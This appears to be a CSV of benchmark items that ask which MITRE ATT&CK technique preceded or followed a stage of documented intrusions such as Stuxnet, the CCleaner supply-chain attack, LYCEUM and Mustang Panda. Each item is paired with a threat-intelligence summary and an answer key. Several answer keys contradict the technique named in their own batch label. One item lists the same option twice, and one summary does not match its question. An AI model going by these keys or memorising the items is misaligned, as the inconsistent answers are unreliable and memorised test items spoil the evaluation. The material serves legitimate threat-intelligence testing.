Question ID,AttackSeq ID,Batch ID,Question,A,B,C,D,CTI Outline,Answer
2356,39,39-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,Which ATT&CK technique most likely occurred before BRONZE PRESIDENT used native tools like vssadmin to create volume shadow copies on domain controllers during their privilege escalation efforts?,T1562-Impair Defenses,T1574.001-DLL Search Order Hijacking,T1548-Abuse Elevation Control Mechanism,T1497-Virtualization/Sandbox Evasion,"Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.
Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",C
2869,9,9-Defense Evasion-T1027-Obfuscated Files or Information,Which ATT&CK technique most likely occurred before the malware payload within CCleaner 5.33 attempted to evade detection by zeroing out the IMAGE_DOS_HEADER and using a valid digital signature?,T1027-Obfuscated Files or Information,T1490-Inhibit System Recovery,T1222-File and Directory Permissions Modification,T1008-Fallback Channels,"Initial Access: The CTI report from September 18, 2017, authored by Edmund Brumaghin and others from Cisco's Talos Intelligence Group, details a supply chain attack where the download servers of the software vendor Avast were compromised to distribute a malicious version of CCleaner. The affected version, CCleaner 5.33, released on August 15, 2017, contained a multi-stage malware payload. The 32-bit CCleaner binary included in the installer had been modified to execute malicious code before proceeding with the normal CCleaner operations. This version was hosted on CCleaner's download server until September 11, 2017, and was signed with a valid certificate issued to Piriform Ltd by Symantec, valid through October 10, 2018. A second malicious sample was also discovered, signed approximately 15 minutes after the first one.
Execution: The malicious 32-bit CCleaner binary from the installer for version 5.33 was modified to call to the code at CC_InfectionBase(0x0040102C), redirecting code execution flow to the malicious code. This initiated the decryption of data containing two stages of the malicious payload: a Position Independent Code (PIC) PE loader and a DLL file functioning as the malware payload. The malware author attempted to evade detection by zeroing out the IMAGE_DOS_HEADER. The binary created an executable heap, copied the decrypted malware to it, and then called the PE loader to begin its operation. After initiating the infection process, the binary erased the memory regions containing the PE loader and the DLL file, destroyed the heap, and continued with normal CCleaner operations.
Command and Control: The malware established a Command and Control (C2) channel by encrypting and encoding system information using modified Base64, then transmitting it via an HTTPS POST request to 216[.]126[.]225[.]148. The communications leveraged a hardcoded HTTP Host header set to speccy[.]piriform[.]com and ignored security errors from the server's self-signed SSL certificate. If no response was received from the C2 server, the malware fell back to a Domain Generation Algorithm (DGA). The malware stored the C2 IP address and the current system time plus two days in the registry at HKLM\SOFTWARE\Piriform\Agomo:NID and HKLM\SOFTWARE\Piriform\Agomo:TCID, respectively.
Impact: The impact of the attack could be severe due to the high number of systems potentially affected. CCleaner claimed over 2 billion downloads worldwide as of November 2016. Affected systems needed to be restored to a state before August 15, 2017, or reinstalled, and users were advised to update to the latest version of CCleaner, which at the time of the report was version 5.34.
Others: The CTI report includes additional information about the investigation and response to the threat. Cisco Talos released ClamAV signatures 6336251 and 6336252 to detect the threat. Advanced Malware Protection (AMP), Cisco's Web Security Appliance (WSA), AMP Threat Grid, and Umbrella were recommended for protection against the threat. Indicators of Compromise (IoCs) were provided, including file hashes, DGA domains, and IP addresses. The report also noted that antivirus detection for this threat was low at the time of writing.",A
1359,274,274-Initial Access-T1189-Drive-by Compromise,"After CrowdStrike's Falcon Host detected an attack involving a first stage downloader saving a file at ""%Temp%/Rdws.exe"" that later retrieves a second stage PlugX file, which ATT&CK technique most likely facilitated the adversary's method of gaining access through the compromised website spoofing the ""Center on Budget and Policy Priorities""?",T1566.003-Spearphishing via Service,T1573-Encrypted Channel,T1648-Serverless Execution,T1189-Drive-by Compromise,"Command and Control: The INOCNATION Campaign involved a new variant of Sakula malware that conducted C2 communications with the domain inocnation[.]com. The Ironman Campaign involved Sakula malware that communicated with a C2 IP address of 180.210.206.246. The French Aerospace Campaign involved Sakula connecting to a C2 domain of oa[.]ameteksen[.]com. The Sakula malware has been linked to the use of a number of zero-day exploits and high-profile incidents such as those resulting in healthcare and government data breach notifications earlier this year.
Others: The Sakula malware variant has been linked to several significant targeted intrusion campaigns over the past 2-3 years, including the ""French Aerospace"" Campaign and the ""Ironman"" Campaign. CrowdStrike has observed limited use of what appears to be a third Sakula variant. Sakula is assessed as a limited-release tool in use by multiple adversaries. There is an apparent connection between the use of Sakula and PlugX, with evidence that Sakula and PlugX samples have relied on the same C2 infrastructure. The Sakula malware demonstrates the difficulty of attribution and the rationale for bookending technical information with analytic judgments. It is likely used by a small subset of operators, which, given the access to zero-day exploits and high-profile operations, are likely well-resourced.",A
2662,61,61-Collection-T1039-Data from Network Shared Drive,"After the Korplug malware gathered system information and network details such as uptime, Windows version, and CPU clock rate, which ATT&CK technique most likely occurred to enable the malware to access and collect data from shared resources within the target's network?",T1555.002-Securityd Memory,T1082-System Information Discovery,T1039-Data from Network Shared Drive,T1602-Data from Configuration Repository,"Resource Development: ESET researchers discovered an ongoing campaign by Mustang Panda using a new Korplug variant named Hodur, which has been active since at least August 2021. The campaign targets research entities, internet service providers, and European diplomatic missions, leveraging current events in Europe, such as Russia's invasion of Ukraine, to lure victims with phishing documents. The group behind the campaign, attributed to Mustang Panda (also known as TA416, RedDelta, or PKPLUG), is known for targeting governmental entities and NGOs, primarily in East and Southeast Asia, with a focus on Mongolia. They have also targeted the Vatican in 2020. The campaign uses custom loaders for shared malware like Cobalt Strike, Poison Ivy, and Korplug, and is characterized by the use of anti-analysis techniques and control-flow obfuscation at every stage of the deployment process.
Initial Access: The initial access vector is not explicitly observed but is believed to involve phishing and watering hole attacks. The campaign uses filenames related to current events, such as 'COVID-19 travel restrictions EU reviews list of third countries.exe' and 'Situation at the EU borders with Ukraine.exe', to deliver a downloader that also opens a decoy document to distract the victim. These documents are often legitimate and publicly accessible, reflecting the filenames used.
Execution: Mustang Panda's campaign utilizes a custom loader to execute the new Korplug variant. The loader is a DLL that exploits a side-loading vulnerability in a legitimate, signed executable. The loader exports multiple functions, but only one function is responsible for loading the final malware stage. The loader function decrypts the encrypted Korplug file in memory and makes the buffer executable before calling into it.
Persistence: The Korplug variant establishes persistence by creating a directory under %allusersprofile%, marking it as hidden and system, and copying the necessary files to this directory. It then sets up persistence either by creating a scheduled task to run at boot or by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run. The malware launches the executable from its new location and exits.
Defense Evasion: Mustang Panda's campaign features heavy use of control-flow obfuscation and anti-analysis techniques at every stage of the deployment process. The downloader and loader use various methods to obfuscate the control flow, including junk code, opaque predicates, and encrypted stack strings. The Korplug file is encrypted and only decrypted at runtime, and its configuration data is encrypted with XOR. The directories created during the installation process are set as hidden system directories, and the malware can run commands on a hidden desktop.
Discovery: The Korplug variant collects extensive information about the system, including uptime, Windows version, CPU clock rate, amount of RAM, and display resolution. It also retrieves the system locale, hostname, and IP addresses, and uses GetSystemTime to retrieve the current system time.
Command and Control: Korplug communicates with C&C servers using a custom TCP-based protocol. The initial handshake can be done over HTTPS or TCP, and subsequent communication is always done over TCP. The communication is encrypted using RC4 and may use non-standard ports. The configuration contains fallback C&C servers, and Korplug can download additional files from the C&C server.
Exfiltration: Data exfiltration is performed via the same custom protocol used to send and receive commands, involving TCP messages with a header followed by a compressed and encrypted message body.
Others: The campaign uses filenames that reflect current events to lure victims, demonstrating Mustang Panda's ability to quickly react to world events. The group iteratively improves its tools, including the use of trident downloaders to deploy Korplug. ESET Research offers private APT intelligence reports and data feeds, and inquiries can be directed to threatintel@eset.com.",C
1121,24,24-Discovery-T1087-Account Discovery,Which ATT&CK technique most likely occurred after LYCEUM gained additional access from credentials gathered via Decrypt-RDCMan.ps1 and before targeting HR and IT personnel with spearphishing emails to acquire information for further operational planning?,T1087-Account Discovery,T1497-Virtualization/Sandbox Evasion,T1133-External Remote Services,T1212-Exploitation for Credential Access,"Initial Access: The LYCEUM threat group gained initial access to organizations by using account credentials obtained through password spraying or brute-force attacks. They then sent spearphishing emails with malicious Excel attachments to deliver the DanBot malware.
Execution: LYCEUM executed the DanBot malware, a first-stage remote access trojan (RAT) that uses DNS and HTTP-based communication mechanisms. The malware provides basic remote access capabilities, including the ability to execute arbitrary commands via cmd.exe and to upload and download files. Additionally, the group used a PowerShell-based keylogger (kl.ps1), a script to decrypt passwords from the RDCMan configuration file (Decrypt-RDCMan.ps1), and a script to gather account information from Active Directory (Get-LAPSP.ps1).
Defense Evasion: LYCEUM utilized DanDrop, a VBA macro embedded in an Excel XLS file, to drop the DanBot malware. They made incremental improvements to obfuscate the macro and refactor some of the functionality to evade defenses.
Credential Access: LYCEUM deployed tools such as Decrypt-RDCMan.ps1 to decrypt passwords stored in the RDCMan configuration file and Get-LAPSP.ps1 to gather account information from Active Directory, which could provide additional access within the environment.
Command and Control: LYCEUM registered new domains for individual campaigns, which were typically used within a few weeks of registration. These domains, suspected to be part of LYCEUM's command and control infrastructure, often had a security or web technology theme.
Others: The LYCEUM threat group has been active since at least April 2018, targeting critical infrastructure organizations in the Middle East, particularly in the oil and gas sector. They have demonstrated capabilities similar to other threat groups operating in the region, such as COBALT GYPSY and COBALT TRINITY. Secureworks Counter Threat Unit researchers recommend implementing multi-factor authentication, increasing visibility via endpoint detection, response, and logging, conducting preparedness exercises, and reinforcing phishing awareness to mitigate the threat posed by LYCEUM.",A
907,218,218-Defense Evasion-T1055-Process Injection,"After leveraging obfuscated batch scripts to evade antivirus detection and employing living-off-the-land techniques, which ATT&CK technique most likely occurred before Dexphot wrote five key files to disk for execution by targeting legitimate system processes?",T1574.002-DLL Side-Loading,T1218.008-Odbcconf,T1053-Scheduled Task/Job,T1055-Process Injection,"Execution: The Dexphot attack, first detected in October 2018, involved a complex execution stage where it wrote five key files to disk: an installer with two URLs, an MSI package file, a password-protected ZIP archive, a loader DLL, and an encrypted data file containing three additional executables. These executables were loaded into system processes via process hollowing, targeting legitimate system processes such as msiexec.exe, unzip.exe, rundll32.exe, schtasks.exe, and powershell.exe, and later svchost.exe, tracert.exe, and setup.exe.
Persistence: Dexphot ensured persistence through dual monitoring services that checked the status of all three malicious processes and re-infected the device if any were terminated. It also used schtasks.exe to create scheduled tasks for updates and re-infection, employing techniques like Scheduled Task and Signed Binary Proxy Execution. The tasks called msiexec.exe as a proxy to run the malicious code and updated Dexphot's components upon system reboot and every 90 or 110 minutes while the system was running.
Others: Microsoft Defender ATP Research Team, led by Hazel Kim, closely monitored the Dexphot threat for over a year, observing its evolution and the attackers' efforts to upgrade the malware, target new processes, and work around defensive measures. Microsoft Defender ATP's behavioral blocking and containment capabilities were crucial in stopping the Dexphot campaign. The team's insights into the goals and motivations of Dexphot's authors contributed to a broader understanding of cybercriminal behavior.",C
403,151,151-Defense Evasion-T1622-Debugger Evasion,"After the malicious Excel file prompted the victim to enable Macro content and executed the payload using ShellExecute under cmd.exe and Rundll32, which ATT&CK technique most likely occurred before the malware established mechanisms to hide from debuggers such as Ollydbg and IDA?",T1566-Phishing,T1207-Rogue Domain Controller,T1622-Debugger Evasion,T1033-System Owner/User Discovery,"Initial Access: The Gholee malware campaign utilized a spear phishing attack with a malicious Excel file named 'Operation Protective Edge.xlsb' (MD5: d0c3f4c9896d41a7c42737134ffb4c2e) to gain initial access to the victim's computer. The file, first uploaded to Virus Total on August 10, 2014, from Israel, was not initially detected as malicious by any antivirus engines. On August 19, 2014, it was detected by Kaspersky as Trojan-Dropper.MSExcel.Agent.ce.
Execution: Upon enabling Macro content in the malicious Excel file, the victim is presented with a message that disappears to show different content. The Macro code uses ASCII character codes to avoid detection and concatenates them into a single variable within a function. These functions are then combined to create a single PE file, which is saved as NTUSER.data.{GUIDE}.dll (MD5: 48573a150562c57742230583456b4c02) and executed using ShellExecute under cmd.exe /C and Rundll32 to hide the process.
Command and Control: The Gholee malware establishes command and control by communicating with a Kuwait-based IP address (83.170.33.60) owned by German company iABG Mbh. It opens an SSL connection over port 443 using an expired digital certificate issued to Core Security for *coreimpactagent.net by Thawte certificate authority. The certificate fingerprint is MD5: 9C 80 C2 47 40 6D 6C ED FC E0 08 AEEF D9 98 90. The malware's HTTP communication pattern includes GET and POST requests to /index.php with specific parameters.
Others: Related incidents reveal another file 'svchost 67.exe' (MD5: 916be1b609ed3dc80e5039a1d8102e82) uploaded to Virus Total on June 2, 2014, from Latvia, which communicated with an IP address (83.170.33.37) in the same netblock as the Gholee malware. Detection and prevention measures include disabling macro code via GPO, blocking files containing macro code at the email gateway, and monitoring logs and proxy servers for communication with the malware-associated IP addresses. A Yara rule is provided for detecting the Gholee malware.",C
876,212,212-Defense Evasion-T1574-Hijack Execution Flow,"After gaining initial access via email delivery of a Gh0st RAT sample, which ATT&CK technique most likely occurred before ASERT identified the reuse of long-standing C2 domains such as etybh[.]com in the Musical Chairs campaign?",T1006-Direct Volume Access,T1137.004-Outlook Home Page,T1566-Phishing,T1574-Hijack Execution Flow,"Initial Access: The actors behind the Musical Chairs campaign have been observed delivering a new sample of Gh0st RAT via email, consistent with their documented tactics. Artifacts provided by malware-traffic-analysis.net indicate the use of email as a delivery mechanism.
Execution: The actors have transitioned from using BAT and JS files in the infection process to employing DLL side-loading techniques. A signed executable is used to load a malicious DLL, which then launches the actual Gh0st DLL.
Command and Control: ASERT has discovered new command-and-control infrastructure associated with the Musical Chairs campaign. The actors are known for the longevity of their C2 domains, reusing them even after identification. A new domain, etybh[.]com, has been registered and is expected to be used in new intrusions. The domain shares the same IP and registrar with previously known C2 domains yourbroiler[.]com and meitanjiaoyiwang[.]com.
Others: ASERT has amended a previous blog post to remove an incorrect association with the APT group responsible for the Night Dragon campaign. The correction was made following input from the research team at Palo Alto Networks.",D
1761,320,320-Command and Control-T1071-Application Layer Protocol,"After deploying multiple variants of their custom VBS backdoor and executing VBS scripts for potential data collection, which ATT&CK technique most likely occurred to establish communication with Shuckworm's servers and download additional payloads?",T1071-Application Layer Protocol,T1571-Non-Standard Port,T1053.007-Container Orchestration Job,T1053-Scheduled Task/Job,"Initial Access: The attack chain initiated by Shuckworm against a Ukrainian organization began on July 14, 2021, with the opening of a malicious document, likely delivered via phishing email. The document contained a custom backdoor known as Pterodo, which was executed using a suspicious command.
Execution: Following the initial compromise, Shuckworm executed various VBS scripts and HTA files to maintain their presence and execute their backdoor. They also created scheduled tasks to ensure persistence and executed commands via scripts. On July 16, additional variants of Pterodo were executed, and on July 28, a VNC client was installed as the ultimate payload for the attack.
Persistence: Shuckworm established persistence by creating scheduled tasks that executed malicious VBS files every few minutes. These tasks ensured that their backdoor would remain active even after system reboots.
Defense Evasion: Shuckworm utilized mshta.exe to bypass application control solutions and browser security settings. They also used scheduled tasks and VBS scripts to evade detection and maintain their foothold.
Collection: Between July 29 and August 18, Shuckworm deployed multiple variants of their custom VBS backdoor and executed VBS scripts. It is unclear if the documents accessed during this period were part of the attackers' efforts to collect and exfiltrate sensitive information.
Others: Symantec's Threat Hunter Team, part of Broadcom Software, has been tracking Shuckworm's cyber-espionage activities against Ukraine. Shuckworm, also known as Gamaredon or Armageddon, has been active since at least 2013 and has recently increased the sophistication of their attacks. The Security Service of Ukraine (SSU) reported that Shuckworm has been using living-off-the-land tools to steal credentials and move laterally on victim networks. Symantec's investigation revealed seven files used by Shuckworm in their attacks, all of which are 7-zip SFX self-extracting binaries. These files included various VBS files, a VNC client, and a Process Explorer binary. The IOCs from the investigation showed patterns such as C&C IPs belonging to a short list of hosting providers and suspected malicious files found in specific directories with names starting with the letter 'd'. The SSU report from November 2021 attributed over 5,000 attacks to Shuckworm since 2014, targeting more than 1,500 Ukrainian government systems.",A
681,185,185-Lateral Movement-T1210-Exploitation of Remote Services,"Which ATT&CK technique most likely occurred after Stuxnet propagated through the network using the MS08-067 RPC vulnerability and the MS10-061 Print Spooler vulnerability to infect other systems, but before it began communicating with command and control (C&C) servers through encrypted HTTP connections?",T1210-Exploitation of Remote Services,T1021.007-Cloud Services,T1068-Exploitation for Privilege Escalation,T1132.001-Standard Encoding,"Initial Access: The Stuxnet worm exploited the CVE-2010-2568 vulnerability to gain initial access to systems. This vulnerability was related to the way Windows displayed shortcut icons. Stuxnet used malicious .LNK files that, when viewed, would automatically execute the malware without user interaction. The worm specifically targeted SCADA systems, but its propagation method allowed it to spread widely. The initial infection vector was through removable drives, such as USB flash drives, which contained the malicious .LNK files and two TMP files (~WTR4141.TMP and ~WTR4132.TMP). The .LNK files were crafted to load the ~WTR4141.TMP file, which in turn would load and execute the ~WTR4132.TMP file, leading to the infection of the host machine.
Execution: Stuxnet's execution phase involved running malicious code on both local and remote systems. The worm's main module, a DLL packed with UPX, contained multiple resources including two kernel-mode drivers (MrxCls.sys and MrxNet.sys) and additional user-mode components. These drivers were responsible for injecting code into processes and hiding files used for propagation. Stuxnet also replaced legitimate system files with malicious versions to maintain persistence and control over infected systems. The malware executed exported functions from its main module to perform various tasks, such as building and running its dropper, spreading through the network, and communicating with command and control (C&C) servers.
Persistence: Stuxnet achieved persistence by installing kernel-mode drivers and user-mode components onto infected systems. It used a boot start service to ensure its kernel-mode driver (MrxCls.sys) was loaded early in the OS boot process. The driver injected code into specific processes and monitored system behavior to maintain control. Additionally, Stuxnet modified system files and registry keys to ensure it was executed upon system startup.
Privilege Escalation: Stuxnet utilized two zero-day vulnerabilities, MS10-073 and MS10-092, to escalate privileges on infected systems. The MS10-073 vulnerability in the win32k.sys system module allowed Stuxnet to execute arbitrary code with SYSTEM privileges by loading a specially crafted keyboard layout file. The MS10-092 vulnerability in the Windows Task Scheduler Service enabled Stuxnet to elevate its privileges up to SYSTEM level by manipulating the metadata of scheduled tasks. The worm used these elevated privileges to perform actions that would otherwise be restricted.
Defense Evasion: Stuxnet employed multiple techniques to evade detection and analysis. It used rootkit functionality to hide its presence on infected systems, including hiding files and injecting code into processes. The worm also utilized stolen digital certificates to sign its kernel-mode drivers, making them appear as legitimate software components. Additionally, Stuxnet patched system libraries and hooked functions to load non-existent libraries, reducing the likelihood of detection by heuristic methods.
Command and Control: Stuxnet communicated with C&C servers using HTTP. It encrypted its communications and sent data to predefined URLs, which included both decoy URLs (such as www.windowsupdate.com) and actual C&C server URLs (such as www.mypremierfutbol.com). The worm's C&C protocol involved sending system information and receiving commands or updates. Stuxnet also implemented an RPC server for peer-to-peer communication, allowing it to receive updates from other infected machines on the network.",C
2428,398,398-Lateral Movement-T1550-Use Alternate Authentication Material,"After leveraging the bank's established connectivity with the processor's network for reconnaissance of the card processing service, which ATT&CK technique most likely occurred before the attackers used credentials to navigate laterally into the processor's network?",T1548.003-Sudo and Sudo Caching,T1550-Use Alternate Authentication Material,T1072-Software Deployment Tools,T1550-Use Alternate Authentication Material,"Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.
Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.
Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.
Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.",C
